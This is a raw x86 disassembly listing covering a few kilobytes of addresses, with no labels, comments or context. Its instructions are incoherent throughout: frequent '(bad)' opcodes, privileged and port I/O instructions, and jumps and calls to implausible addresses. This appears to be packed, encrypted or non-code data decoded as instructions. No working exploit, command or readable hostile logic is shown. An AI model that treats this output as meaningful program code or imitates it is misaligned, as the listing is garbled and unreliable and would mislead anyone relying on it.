  411c86:	(bad)  
  411c87:	pop    ds
  411c88:	or     DWORD PTR [ebp-0x4],esi
  411c8b:	xchg   ebx,eax
  411c8c:	xchg   edx,eax
  411c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c8e:	popf   
  411c8f:	push   esp
  411c90:	retf   0xcdd6
  411c93:	cwde   
  411c94:	xor    eax,0xd6cb1fbe
  411c99:	nop
  411c9a:	jb     0x411c64
  411c9c:	and    dh,bl
  411c9e:	outs   dx,DWORD PTR gs:[esi]
  411ca0:	inc    edx
  411ca1:	mov    ?,WORD PTR [eax+ebp*8]
  411ca4:	fcom   DWORD PTR [eax]
  411ca6:	pop    ecx
  411ca7:	rcr    ecx,cl
  411ca9:	dec    ebx
  411caa:	imul   ecx,DWORD PTR [edi],0xfb5d61e0
  411cb0:	test   al,0x4
  411cb2:	add    dh,bh
  411cb4:	test   DWORD PTR [edx+0xf],esp
  411cb7:	xchg   edx,eax
  411cb8:	fs mov esi,0xd164217a
  411cbe:	daa    
  411cbf:	cdq    
  411cc0:	mov    ss,ebp
  411cc2:	jae    0x411c98
  411cc4:	ret    0x45c6
  411cc7:	leave  
  411cc8:	sub    ecx,DWORD PTR [ecx]
  411cca:	sbb    bh,bh
  411ccc:	(bad)  
  411ccd:	cmp    al,0x10
  411ccf:	cs nop
  411cd1:	call   0x396e6d00
  411cd6:	clc    
  411cd7:	(bad)  
  411cd8:	jns    0x411cb8
  411cda:	hlt    
  411cdb:	or     ebp,DWORD PTR [esp+ebx*1-0x531e4229]
  411ce2:	cmp    edx,DWORD PTR [eax]
  411ce4:	jp     0x411c97
  411ce6:	int3   
  411ce7:	mov    esp,0x6acf1758
  411cec:	popf   
  411ced:	fisub  WORD PTR [edi-0x5a]
  411cf0:	dec    ecx
  411cf1:	(bad)  
  411cf2:	push   ecx
  411cf3:	fadd   QWORD PTR [ecx-0x3c137f2d]
  411cf9:	jo     0x411c95
  411cfb:	dec    ebx
  411cfc:	gs dec esp
  411cfe:	outs   dx,BYTE PTR ds:[esi]
  411cff:	or     esp,ecx
  411d01:	adc    DWORD PTR [eax+ecx*4],ebp
  411d04:	adc    al,0x26
  411d06:	fwait
  411d07:	push   ebx
  411d08:	int3   
  411d09:	in     al,dx
  411d0a:	push   ebx
  411d0b:	or     BYTE PTR ds:0x93dd52d9,al
  411d11:	clc    
  411d12:	out    0xc2,eax
  411d14:	push   ss
  411d15:	jo     0x411ce5
  411d17:	clc    
  411d18:	fs adc al,0xb3
  411d1b:	shl    BYTE PTR [ebx+0x75],cl
  411d1e:	add    BYTE PTR [ecx+0x158a5468],0xc8
  411d25:	mov    ecx,eax
  411d27:	xor    eax,0xcf932737
  411d2c:	sahf   
  411d2d:	xchg   ecx,eax
  411d2e:	or     ah,0xa4
  411d31:	xor    eax,0x441e4c12
  411d36:	adc    DWORD PTR [ecx+0x1d],esi
  411d39:	stos   DWORD PTR es:[edi],eax
  411d3a:	mov    ds:0x7b299881,al
  411d3f:	loop   0x411d62
  411d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d42:	fwait
  411d43:	adc    eax,0xdc8467e5
  411d48:	add    bl,bh
  411d4a:	cmp    ecx,DWORD PTR [edi-0x41]
  411d4d:	das    
  411d4e:	xor    bh,0x42
  411d51:	inc    ecx
  411d52:	mov    ebx,0x63749569
  411d57:	clc    
  411d58:	ret    0xe0ab
  411d5b:	dec    eax
  411d5c:	push   edi
  411d5d:	ret    0x776e
  411d60:	cwde   
  411d61:	pop    eax
  411d62:	jo     0x411d6f
  411d64:	cs jae 0x411d6e
  411d67:	arpl   WORD PTR [eax],bx
  411d69:	push   esp
  411d6a:	xor    eax,0x15a6cbd3
  411d6f:	mov    DWORD PTR [ebx-0xb],eax
  411d72:	jmp    0xf2c1fbe7
  411d77:	dec    ebx
  411d78:	aam    0x89
  411d7a:	ds jle 0x411dd0
  411d7d:	call   edx
  411d7f:	js     0x411d96
  411d81:	jae    0x411dd5
  411d83:	pop    esi
  411d84:	jle    0x411db6
  411d86:	add    BYTE PTR [eax-0x42],0xa7
  411d8a:	ret    0xba06
  411d8d:	repnz inc esi
  411d8f:	ds or  eax,0xcceaea2b
  411d95:	adc    BYTE PTR [esi-0x46633db],dl
  411d9b:	push   esp
  411d9c:	mov    edi,0x28f136a7
  411da1:	hlt    
  411da2:	pop    ds
  411da3:	in     eax,dx
  411da4:	ror    BYTE PTR [ebp+0x56],1
  411da7:	mov    dl,0x69
  411da9:	dec    esi
  411daa:	pop    edx
  411dab:	mov    ah,0x53
  411dad:	mov    dh,BYTE PTR [ebx+0x42a52fd0]
  411db3:	inc    edx
  411db4:	shr    ebp,0x30
  411db7:	mov    bh,0xc2
  411db9:	imul   ebx,DWORD PTR [ebx+0x34d5f79],0xaad1cd47
  411dc3:	fimul  WORD PTR [ebx+eiz*2]
  411dc6:	retf   0xa0ea
  411dc9:	into   
  411dca:	adc    BYTE PTR [ebp-0x7d0c4489],ah
  411dd0:	sub    esp,DWORD PTR [edi]
  411dd2:	std    
  411dd3:	pushf  
  411dd4:	sub    BYTE PTR [ecx+0x5029f1e6],0xf3
  411ddb:	jmp    0xbd804f91
  411de0:	inc    ecx
  411de1:	xor    ch,0x14
  411de4:	xor    eax,0xa1798942
  411de9:	sbb    ch,BYTE PTR [esi+0x26]
  411dec:	stc    
  411ded:	push   esp
  411dee:	adc    BYTE PTR [esi-0x57],cl
  411df1:	sbb    DWORD PTR [ebp+0x499c74e1],esi
  411df7:	mov    ds:0x94a9f7a7,al
  411dfc:	int    0x99
  411dfe:	loop   0x411e14
  411e00:	retf   
  411e01:	in     al,0x1a
  411e03:	mov    edi,gs
  411e05:	dec    esi
  411e06:	and    al,0xa9
  411e08:	sti    
  411e09:	(bad)  
  411e0a:	icebp  
  411e0b:	mov    ecx,0xfcfe75fa
  411e10:	dec    edi
  411e11:	pop    eax
  411e12:	fwait
  411e13:	imul   edi,ebp,0x35eb9ad
  411e19:	fs mov dl,0xc2
  411e1c:	jecxz  0x411da6
  411e1e:	sbb    al,0x14
  411e20:	lods   eax,DWORD PTR ds:[esi]
  411e21:	mov    dh,0xe8
  411e23:	sbb    al,0x7c
  411e25:	mov    bh,0xdb
  411e27:	loop   0x411dca
  411e29:	retf   
  411e2a:	shr    DWORD PTR [edi+0x77],cl
  411e2d:	jl     0x411e7e
  411e2f:	and    eax,0xff90d996
  411e34:	loop   0x411dc7
  411e36:	mov    dl,0xea
  411e38:	outs   dx,BYTE PTR ds:[esi]
  411e39:	aam    0xd3
  411e3b:	cmp    al,BYTE PTR [eax]
  411e3d:	add    BYTE PTR [eax],al
  411e3f:	add    BYTE PTR [eax],al
  411e41:	add    ch,dl
  411e43:	and    BYTE PTR [eax-0x4],0x75
  411e47:	cld    
  411e48:	(bad)  [ecx+0x32bc8e94]
  411e4e:	icebp  
  411e4f:	jmp    0x411e55
  411e51:	adc    al,0xb3
  411e53:	and    DWORD PTR [ecx],eax
  411e55:	add    BYTE PTR [edx],ah
  411e57:	pop    es
  411e58:	add    BYTE PTR [eax],al
  411e5a:	mov    BYTE PTR [esp+ebp*1],bl
  411e5d:	stos   DWORD PTR es:[edi],eax
  411e5e:	mov    dh,BYTE PTR [ecx]
  411e60:	jbe    0x411e54
  411e62:	jbe    0x411dfd
  411e64:	in     al,dx
  411e65:	or     al,BYTE PTR [ebx]
  411e67:	adc    DWORD PTR [ebx-0x373cc1c7],esi
  411e6d:	pop    ecx
  411e6e:	push   ecx
  411e6f:	pop    ebp
  411e70:	scas   eax,DWORD PTR es:[edi]
  411e71:	daa    
  411e72:	and    BYTE PTR [ecx+0x35],ch
  411e75:	cdq    
  411e76:	add    eax,0x91067ad2
  411e7b:	adc    BYTE PTR [edx+0x2d],0xdf
  411e7f:	and    al,0xf4
  411e81:	ffree  st(6)
  411e83:	mov    ebp,0xdc329921
  411e88:	jmp    0x64f9:0xcebdf202
  411e8f:	mov    cl,0x32
  411e91:	sbb    DWORD PTR [edi+0x7fbe3480],0x8ee88d23
  411e9b:	retf   
  411e9c:	xchg   DWORD PTR [ebx],ebx
  411e9e:	mov    WORD PTR [edx+edi*4],?
  411ea1:	sub    edx,edx
  411ea3:	adc    esp,DWORD PTR [esi]
  411ea5:	retf   
  411ea6:	nop
  411ea7:	mov    eax,0xcf4252a7
  411eac:	mov    ebp,0x97fa2b38
  411eb1:	xor    cl,ch
  411eb3:	xlat   BYTE PTR ds:[ebx]
  411eb4:	cli    
  411eb5:	adc    al,BYTE PTR [ebx-0x41]
  411eb8:	sbb    dl,BYTE PTR [eax+0x3e]
  411ebb:	mov    ds:0x1bf123fe,al
  411ec0:	xor    DWORD PTR ds:0x89e5ac1e,ebp
  411ec6:	test   BYTE PTR [edx+0x38],bl
  411ec9:	aas    
  411eca:	cmp    BYTE PTR ds:0x5d795bf8,dl
  411ed0:	aaa    
  411ed1:	sub    ebp,DWORD PTR [edx+0x31d6f26f]
  411ed7:	call   esi
  411ed9:	xlat   BYTE PTR ds:[ebx]
  411eda:	test   BYTE PTR [edx-0x47],al
  411edd:	push   cs
  411ede:	mov    ah,0x8d
  411ee0:	shr    DWORD PTR [edi],1
  411ee2:	stos   BYTE PTR es:[edi],al
  411ee3:	mov    ah,0x71
  411ee5:	test   eax,0x6b678081
  411eea:	cli    
  411eeb:	mov    esp,0x2c37ebc2
  411ef0:	cmp    bl,BYTE PTR [ecx]
  411ef2:	xchg   esp,eax
  411ef3:	sahf   
  411ef4:	jno    0x411f59
  411ef6:	and    al,0xd6
  411ef8:	push   es
  411ef9:	pushf  
  411efa:	push   esp
  411efb:	repz xchg ebp,eax
  411efd:	cmp    eax,ebp
  411eff:	fsub   st,st(7)
  411f01:	test   BYTE PTR [edx],bl
  411f03:	fwait
  411f04:	dec    ebp
  411f05:	mov    eax,esp
  411f07:	shl    DWORD PTR [eax],0xd6
  411f0a:	pusha  
  411f0b:	ss pop eax
  411f0d:	inc    ebp
  411f0e:	fisttp QWORD PTR [eax-0x44]
  411f11:	std    
  411f12:	dec    ebx
  411f13:	cmp    ebp,DWORD PTR [edi-0xe4c813d]
  411f19:	imul   ebp
  411f1b:	push   ecx
  411f1c:	es dec esi
  411f1e:	std    
  411f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f20:	adc    eax,0xf75e075
  411f25:	cwde   
  411f26:	popf   
  411f27:	pop    es
  411f28:	or     ebp,DWORD PTR [edx+ecx*8-0x44716cc7]
  411f2f:	jmp    0x56184e41
  411f34:	push   cs
  411f35:	cmp    dh,dl
  411f37:	sbb    edi,esp
  411f39:	lahf   
  411f3a:	test   BYTE PTR gs:[ecx],0x20
  411f3e:	stos   BYTE PTR es:[edi],al
  411f3f:	and    DWORD PTR [ebp+0x33],0x69e461c5
  411f46:	cli    
  411f47:	add    ecx,DWORD PTR [edx+0x116f527a]
  411f4d:	ror    al,cl
  411f4f:	and    al,0x7a
  411f51:	jnp    0x411fc8
  411f53:	pop    ecx
  411f54:	mov    eax,ds:0xc78ae2f0
  411f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f5a:	scas   eax,DWORD PTR es:[edi]
  411f5b:	in     eax,0x4c
  411f5d:	outs   dx,BYTE PTR cs:[esi]
  411f5f:	mov    ebp,0x768034ba
  411f64:	data16 jns 0x411f90
  411f67:	xchg   edi,eax
  411f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f69:	stos   DWORD PTR es:[edi],eax
  411f6a:	aad    0xd5
  411f6c:	xlat   BYTE PTR ds:[ebx]
  411f6d:	in     eax,dx
  411f6e:	or     eax,0x4ea2b649
  411f73:	push   ss
  411f74:	cdq    
  411f75:	call   0x183ba022
  411f7a:	jo     0x411f93
  411f7c:	push   eax
  411f7d:	sub    eax,0xa6a169ab
  411f82:	xchg   ebp,eax
  411f83:	test   ebx,edx
  411f85:	cld    
  411f86:	mov    dh,0xbc
  411f88:	int3   
  411f89:	sbb    edi,esp
  411f8b:	ins    DWORD PTR es:[edi],dx
  411f8c:	jbe    0x411f1c
  411f8e:	jae    0x411f5f
  411f90:	cmp    DWORD PTR [esi-0x17b526bb],edx
  411f96:	ret    
  411f97:	cs jle 0xe42d2c86
  411f9e:	fldenv [ebp-0x7c]
  411fa1:	call   0x61a575f7
  411fa6:	repz push edx
  411fa8:	add    eax,0x61e694cc
  411fad:	cmp    eax,0xd99fd8c6
  411fb2:	jl     0x411f97
  411fb4:	ss xor cl,bl
  411fb7:	jl     0x411f82
  411fb9:	dec    ebp
  411fba:	loopne 0x411f5e
  411fbc:	fdivr  QWORD PTR [ebx-0x24f7949e]
  411fc2:	inc    edi
  411fc3:	leave  
  411fc4:	push   es
  411fc5:	shl    BYTE PTR [ebx],0x79
  411fc8:	adc    BYTE PTR [edx-0x1a9e5b54],ch
  411fce:	jae    0x412045
  411fd0:	mov    ds:0x53bac50d,eax
  411fd5:	mov    ebp,0xfce50ff7
  411fda:	(bad)  
  411fdb:	std    
  411fdc:	loop   0x412050
  411fde:	fistp  DWORD PTR [edi-0xa326531]
  411fe4:	mov    al,ds:0x76e67684
  411fe9:	aas    
  411fea:	inc    esi
  411feb:	jg     0x412065
  411fed:	mov    ds:0x278eb755,eax
  411ff2:	mov    ch,0xa
  411ff4:	cmp    bh,BYTE PTR [eax+0x35]
  411ff7:	and    DWORD PTR [esi],eax
  411ff9:	jmp    0xca6f3bb9
  411ffe:	xchg   ecx,eax
  411fff:	ret    
  412000:	cmc    
  412001:	iret   
  412002:	fmul   st(6),st
  412004:	data16 fstp DWORD PTR [ebp-0x3e]
  412008:	int    0xa3
  41200a:	sti    
  41200b:	(bad)  
  41200c:	out    dx,eax
  41200d:	fadd   DWORD PTR ds:0x7d4c272c
  412013:	retf   
  412014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412015:	push   esp
  412016:	sub    BYTE PTR [esi-0x6f],ch
  412019:	xchg   esi,eax
  41201a:	mov    BYTE PTR [eax+eax*2],ch
  41201d:	into   
  41201e:	and    ebp,DWORD PTR [edi-0x691eef19]
  412024:	clc    
  412025:	retf   
  412026:	dec    edi
  412027:	sbb    eax,0x95ba5683
  41202c:	fwait
  41202d:	dec    esp
  41202e:	cmp    ecx,ecx
  412030:	stos   DWORD PTR es:[edi],eax
  412031:	mov    ah,0x6a
  412033:	lahf   
  412034:	or     DWORD PTR [esi],edx
  412036:	imul   edi,DWORD PTR [ebx],0x7e
  412039:	jno    0x41201b
  41203b:	inc    edx
  41203c:	add    eax,0x57aa40d7
  412041:	in     eax,0xf3
  412043:	lods   al,BYTE PTR ds:[esi]
  412044:	stc    
  412045:	and    al,0x6c
  412047:	jnp    0x41209c
  412049:	inc    edx
  41204a:	and    esp,DWORD PTR [eax]
  41204c:	fbld   TBYTE PTR ds:0xf87ac695
  412052:	pop    edi
  412053:	mov    ds:0xd9fd0d99,al
  412058:	shl    BYTE PTR [edx],1
  41205a:	add    BYTE PTR [esi],bh
  41205c:	push   edi
  41205d:	int    0x9f
  41205f:	push   ecx
  412060:	pop    edx
  412061:	fs retf 
  412063:	add    ch,BYTE PTR [ebp+0x3d3b3336]
  412069:	add    BYTE PTR [edi],cl
  41206b:	mov    ebx,DWORD PTR [ebx-0x22a4f0d]
  412071:	sub    DWORD PTR [edi+0xd],esp
  412074:	fisubr DWORD PTR [ebp+0x12]
  412077:	lods   eax,DWORD PTR ds:[esi]
  412078:	lods   eax,DWORD PTR ds:[esi]
  412079:	mov    esi,0x8064fae1
  41207e:	push   es
  41207f:	and    BYTE PTR [edi+eax*1],0x85
  412083:	push   0x51
  412085:	jno    0x41208a
  412087:	int    0xe2
  412089:	mov    ebp,0x204752c0
  41208e:	into   
  41208f:	repnz (bad) 
  412091:	sbb    ecx,ecx
  412093:	mov    ds:0xa4ca2881,al
  412098:	jbe    0x4120ce
  41209a:	ror    BYTE PTR [ebp+0x39],0x5b
  41209e:	xor    al,0x11
  4120a0:	xchg   edi,eax
  4120a1:	add    ch,ah
  4120a3:	jbe    0x412108
  4120a5:	inc    edi
  4120a6:	retw   
  4120a8:	push   ebx
  4120a9:	sbb    al,0x6
  4120ab:	mov    WORD PTR [eax+ebp*4-0x2e222fff],gs
  4120b2:	iret   
  4120b3:	sub    bl,BYTE PTR [esi+0x69]
  4120b6:	inc    esi
  4120b7:	sub    eax,0xd7277e55
  4120bc:	(bad)  
  4120bd:	push   ss
  4120be:	fwait
  4120bf:	ror    DWORD PTR ds:0xb6385614,0xd
  4120c6:	push   ebp
  4120c7:	pop    ebp
  4120c8:	push   0x8a9dc950
  4120cd:	push   edx
  4120ce:	xlat   BYTE PTR ds:[ebx]
  4120cf:	imul   ecx,DWORD PTR ds:0x28af5b9a,0x8ccbedcc
  4120d9:	and    eax,edx
  4120db:	pusha  
  4120dc:	mov    DWORD PTR [edi-0x66dd9c6c],ecx
  4120e2:	das    
  4120e3:	and    ebx,edi
  4120e5:	ja     0x412144
  4120e7:	(bad)  
  4120e8:	fsub   DWORD PTR ds:0xab19a851
  4120ee:	adc    bh,BYTE PTR [ecx]
  4120f0:	mov    esp,0x14772a5e
  4120f5:	jle    0x412168
  4120f7:	jle    0x412118
  4120f9:	dec    esp
  4120fa:	retf   
  4120fb:	mov    ds:0x209a2d13,al
  412100:	(bad)  
  412101:	(bad)  
  412102:	fbstp  TBYTE PTR ds:0x29495666
  412108:	inc    esp
  412109:	xor    eax,0xbda283ca
  41210e:	mov    ch,0x5e
  412110:	jg     0x4120bd
  412112:	lahf   
  412113:	ds adc ah,bl
  412116:	loopne 0x412188
  412118:	sub    eax,0x14137883
  41211d:	push   esi
  41211e:	mov    al,ds:0x56366c8d
  412123:	out    0xb9,eax
  412125:	pop    ss
  412126:	pop    es
  412127:	mov    ?,esp
  412129:	dec    ebp
  41212a:	loopne 0x412113
  41212c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41212d:	ins    BYTE PTR es:[edi],dx
  41212e:	sub    BYTE PTR [ecx+0x1],cl
  412131:	lahf   
  412132:	cmp    ah,BYTE PTR [edx]
  412134:	cmp    edx,DWORD PTR [ecx+0x786efbde]
  41213a:	mov    ds:0x4e4cfccc,eax
  41213f:	mov    bh,0xbb
  412141:	push   ebp
  412142:	mov    ebp,0x9d609c5a
  412147:	xlat   BYTE PTR ds:[ebx]
  412148:	fucomi st,st(1)
  41214a:	push   ebx
  41214b:	jbe    0x41219c
  41214d:	mov    esp,0x9f2e4fb2
  412152:	mov    bl,bl
  412154:	jbe    0x41217d
  412156:	mov    dl,0xbc
  412158:	push   cs
  412159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41215a:	std    
  41215b:	cmp    eax,0x83bfdaae
  412160:	xchg   BYTE PTR [ecx-0x65c9f83a],dh
  412166:	aam    0xa0
  412168:	loop   0x4120f0
  41216a:	iret   
  41216b:	xchg   edx,eax
  41216c:	mov    ecx,0x559959f5
  412171:	mov    edi,0xc51d723a
  412176:	lahf   
  412177:	pop    edx
  412178:	pop    ds
  412179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217a:	mov    esi,0x5f3a758f
  41217f:	xor    al,0xcb
  412181:	pop    ss
  412182:	adc    al,dh
  412184:	loopne 0x4121ab
  412186:	test   al,0x52
  412188:	pop    ebx
  412189:	pushf  
  41218a:	adc    BYTE PTR [esi-0x4a06a151],ah
  412190:	fld    TBYTE PTR [esi+edi*4+0x667f9a5a]
  412197:	fld    DWORD PTR [ecx+0x70]
  41219a:	stc    
  41219b:	adc    esi,DWORD PTR [ecx-0xc]
  41219e:	or     ebp,DWORD PTR [edx+ebx*8-0x80]
  4121a2:	loope  0x412214
  4121a4:	test   DWORD PTR ss:[edi+0x298dc94d],esp
  4121ab:	ins    BYTE PTR es:[edi],dx
  4121ac:	sbb    eax,DWORD PTR [edi]
  4121ae:	sub    edi,DWORD PTR [edi]
  4121b0:	xchg   DWORD PTR [edi],edx
  4121b2:	push   ds
  4121b3:	je     0x4121d8
  4121b5:	sub    al,0xe
  4121b7:	in     al,0xa9
  4121b9:	psrlq  mm4,QWORD PTR [edx-0x54ff6d3a]
  4121c0:	hlt    
  4121c1:	adc    eax,DWORD PTR [ebx]
  4121c3:	or     eax,0xe8b3efdb
  4121c8:	gs or  cl,dl
  4121cb:	nop
  4121cc:	inc    esp
  4121cd:	adc    DWORD PTR [edi+edi*1+0x4d8e422b],0x50
  4121d5:	mov    al,ds:0x9bc8bacd
  4121da:	popf   
  4121db:	pusha  
  4121dc:	fisttp WORD PTR [edi+0x48]
  4121df:	inc    ecx
  4121e0:	rcl    DWORD PTR [ebp+ecx*8+0x78851be2],0x38
  4121e8:	push   esi
  4121e9:	sti    
  4121ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121eb:	inc    ecx
  4121ec:	(bad)  
  4121ed:	sbb    BYTE PTR [edx+eiz*8+0x63482e13],dl
  4121f4:	sub    DWORD PTR [esi-0x74],eax
  4121f7:	pusha  
  4121f8:	add    al,0xfb
  4121fa:	out    0x4a,al
  4121fc:	or     BYTE PTR [edi],bh
  4121fe:	rol    ebp,1
  412200:	cmp    DWORD PTR [eax+ecx*2+0x4ebcac7f],edx
  412207:	loopne 0x41220e
  412209:	scas   al,BYTE PTR es:[edi]
  41220a:	jecxz  0x412219
  41220c:	xor    edi,DWORD PTR [edi-0x7e]
  41220f:	and    al,0xff
  412211:	mov    esp,0xab5ced84
  412216:	jo     0x412276
  412218:	aad    0x21
  41221a:	cmp    BYTE PTR [edx+ebp*8],al
  41221d:	pop    es
  41221e:	fs cs push esp
  412221:	(bad)  
  412222:	into   
  412223:	sbb    ch,ch
  412225:	sub    eax,0x72f2bb99
  41222a:	popa   
  41222b:	loopne 0x4121d2
  41222d:	out    dx,eax
  41222e:	lods   al,BYTE PTR ds:[esi]
  41222f:	out    0x59,al
  412231:	mov    WORD PTR [ebx],?
  412233:	arpl   bp,ax
  412235:	jne    0x41222e
  412237:	fmul   QWORD PTR [edi]
  412239:	push   eax
  41223a:	daa    
  41223b:	fs pop ds
  41223d:	jb     0x4122a3
  41223f:	cmp    esi,DWORD PTR [eax+0xf78c519]
  412245:	call   0x96c3:0x3fa14ff
  41224c:	std    
  41224d:	(bad)  
  41224e:	inc    esp
  41224f:	addr16 jp 0x412235
  412252:	repnz retf 0x6665
  412256:	rcl    BYTE PTR [edi],1
  412258:	loope  0x412261
  41225a:	mov    bl,0xf2
  41225c:	nop
  41225d:	add    esp,DWORD PTR [ebx+0x1d]
  412260:	je     0x41221b
  412262:	in     al,0xf0
  412264:	or     BYTE PTR [edx],0xd9
  412267:	call   0x5d9c72d1
  41226c:	jb     0x412209
  41226e:	shl    DWORD PTR [esi+ecx*1-0x679c9744],0xdf
  412276:	addr16 loopne 0x412231
  412279:	push   0xffffffef
  41227b:	out    0xfc,eax
  41227d:	inc    esi
  41227e:	jmp    0x12b39115
  412283:	out    0x49,eax
  412285:	dec    edi
  412286:	cmp    DWORD PTR [ecx+0x273fdaaa],esi
  41228c:	mov    esi,0x1c79380e
  412291:	mov    esi,0xdd92e222
  412296:	mov    ds:0x20f08997,al
  41229b:	push   0xd010b95
  4122a0:	out    dx,al
  4122a1:	retf   
  4122a2:	jno    0x4122ea
  4122a4:	aaa    
  4122a5:	out    0x63,eax
  4122a7:	or     DWORD PTR [edx],eax
  4122a9:	push   edi
  4122aa:	shl    DWORD PTR [ebx-0x48743932],1
  4122b0:	pop    esp
  4122b1:	push   ebp
  4122b2:	test   DWORD PTR [esi+0x76e66157],eax
  4122b8:	jl     0x41225f
  4122ba:	xor    dh,cl
  4122bc:	pop    esi
  4122bd:	and    esi,ebx
  4122bf:	cmp    ebx,DWORD PTR [eax+0x39]
  4122c2:	cmc    
  4122c3:	push   eax
  4122c4:	inc    ebp
  4122c5:	dec    ebp
  4122c6:	cs mov esi,0xb8b165fe
  4122cc:	jnp    0x41231c
  4122ce:	stos   BYTE PTR es:[edi],al
  4122cf:	xchg   ebx,eax
  4122d0:	mov    ebp,0xed07cb34
  4122d5:	pop    ebp
  4122d6:	push   edi
  4122d7:	push   eax
  4122d8:	inc    ebp
  4122d9:	stos   BYTE PTR es:[edi],al
  4122da:	sbb    al,BYTE PTR [ebp+0x79718c95]
  4122e0:	out    0xc7,eax
  4122e2:	mov    ebx,0x6573bb29
  4122e7:	pop    ds
  4122e8:	inc    eax
  4122e9:	inc    ebp
  4122ea:	call   0x2b9bffce
  4122ef:	jecxz  0x4122fb
  4122f1:	push   ebp
  4122f2:	mov    eax,ds:0xde916e4c
  4122f7:	adc    al,0x27
  4122f9:	xor    dl,BYTE PTR [ebx]
  4122fb:	sub    BYTE PTR [esi-0x49],bl
  4122fe:	or     BYTE PTR [eax+0x1058b6b1],al
  412304:	xchg   esp,eax
  412305:	imul   ebp,DWORD PTR [ecx],0x16532438
  41230b:	imul   ebp,ebp,0xffffff80
  41230e:	imul   edx,eax,0x91353b3b
  412314:	std    
  412315:	cmp    al,0x65
  412317:	es jge 0x41230a
  41231a:	mov    ds:0xfe3d7621,eax
  41231f:	or     DWORD PTR [ebp+edi*4+0x4f],0x72d30e57
  412327:	xlat   BYTE PTR ds:[ebx]
  412328:	pop    eax
  412329:	gs out dx,al
  41232b:	shl    BYTE PTR [edi+eiz*4+0x4ab1ddf0],1
  412332:	sub    eax,0xae1f87ff
  412337:	mul    BYTE PTR [ebp-0x1f867aa6]
  41233d:	sub    esp,0x8ad4cc7f
  412343:	inc    edx
  412344:	sbb    ecx,eax
  412346:	ds popf 
  412348:	cmp    DWORD PTR [ecx+0x6b9e3990],ebp
  41234e:	fsubr  DWORD PTR ds:0x699d0af4
  412354:	ds dec eax
  412356:	loopne 0x4123ac
  412358:	shl    ecx,cl
  41235a:	adc    BYTE PTR [esi+0x2a],0x92
  41235e:	loopne 0x41230f
  412360:	sub    eax,0xefb4d92d
  412365:	add    BYTE PTR [ebx+0x1d9ca49c],0x8b
  41236c:	fdivr  DWORD PTR [esi+0x6b]
  41236f:	xchg   esp,eax
  412370:	enter  0x25d5,0x7
  412374:	cld    
  412375:	mov    ah,0x35
  412377:	int    0xe9
  412379:	nop
  41237a:	jg     0x4123b0
  41237c:	xchg   BYTE PTR [ebp+0x3849e5d8],dh
  412382:	aam    0x6d
  412384:	or     DWORD PTR [ebx+0x3a],ebp
  412387:	jae    0x4123a6
  412389:	sub    edx,0x828372a8
  41238f:	sub    eax,0x31a9449a
  412394:	inc    ebx
  412395:	fst    DWORD PTR [edx+eiz*1-0x26144db1]
  41239c:	push   es
  41239d:	sub    dl,BYTE PTR [edx]
  41239f:	das    
  4123a0:	(bad)  
  4123a1:	out    0x71,eax
  4123a3:	cmp    ebx,DWORD PTR [eax]
  4123a5:	sbb    BYTE PTR [esp+ebx*1+0x570186e3],cl
  4123ac:	xlat   BYTE PTR ds:[ebx]
  4123ad:	mov    edx,0x71f6091
  4123b2:	and    eax,esp
  4123b4:	xchg   ebx,eax
  4123b5:	jmp    0x41238d
  4123b7:	rcr    BYTE PTR [ecx+ebp*2],cl
  4123ba:	enter  0x6393,0x28
  4123be:	mov    bh,0x1c
  4123c0:	adc    bl,BYTE PTR [edx]
  4123c2:	jo     0x412429
  4123c4:	test   eax,0xa2642dfb
  4123c9:	pop    eax
  4123ca:	ins    BYTE PTR es:[edi],dx
  4123cb:	nop
  4123cc:	push   cs
  4123cd:	retf   
  4123ce:	in     al,0x12
  4123d0:	inc    esp
  4123d1:	add    eax,0x784ac018
  4123d6:	(bad)  
  4123d7:	jp     0x412451
  4123d9:	mov    bh,0x35
  4123db:	mov    bh,0x8
  4123dd:	dec    DWORD PTR [eax+0x20b31e81]
  4123e3:	cmp    al,0x29
  4123e5:	das    
  4123e6:	ins    DWORD PTR es:[edi],dx
  4123e7:	(bad)  
  4123e8:	sbb    edx,DWORD PTR [edi-0x6]
  4123eb:	inc    ecx
  4123ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ed:	inc    edi
  4123ee:	(bad)  
  4123f0:	jo     0x4123b2
  4123f2:	mov    WORD PTR [esi],gs
  4123f4:	mov    es,WORD PTR [ebp-0x12]
  4123f7:	mov    edx,0x883b7a7f
  4123fc:	cmp    DWORD PTR [ebx],ecx
  4123fe:	aaa    
  4123ff:	bound  ebp,QWORD PTR [edx+0x5b]
  412402:	data16 mov dh,0x3a
  412405:	push   eax
  412406:	pop    ss
  412407:	ins    BYTE PTR es:[edi],dx
  412408:	sub    al,0x55
  41240a:	cdq    
  41240b:	es inc ebx
  41240d:	adc    al,0xe8
  41240f:	popa   
  412410:	push   ebx
  412411:	fisttp QWORD PTR [ebx+0x6a]
  412414:	fcomi  st,st(1)
  412416:	lds    ebx,FWORD PTR [ecx+ebx*8]
  412419:	push   edi
  41241a:	xchg   BYTE PTR [eax],dl
  41241c:	jns    0x41243f
  41241e:	xchg   ecx,eax
  41241f:	cmp    ebp,ebp
  412421:	xor    al,0x5b
  412423:	and    al,0x62
  412425:	std    
  412426:	enter  0x77ee,0x6f
  41242a:	sti    
  41242b:	xchg   DWORD PTR [ebp-0x2e],ecx
  41242e:	fs ins BYTE PTR es:[edi],dx
  412430:	dec    esi
  412431:	pop    edi
  412432:	fs inc esi
  412434:	push   esp
  412435:	not    edx
  412437:	mov    edi,DWORD PTR [ecx-0x1b]
  41243a:	pop    edx
  41243b:	add    eax,0x6650650b
  412440:	jle    0x41247a
  412442:	adc    eax,0x4ceb013
  412447:	pop    esp
  412448:	cmp    BYTE PTR [ebx+0x3f],dl
  41244b:	hlt    
  41244c:	inc    edx
  41244d:	int    0x51
  41244f:	jnp    0x4123ff
  412451:	adc    DWORD PTR [ecx],ebp
  412453:	cmp    esp,DWORD PTR [ebx]
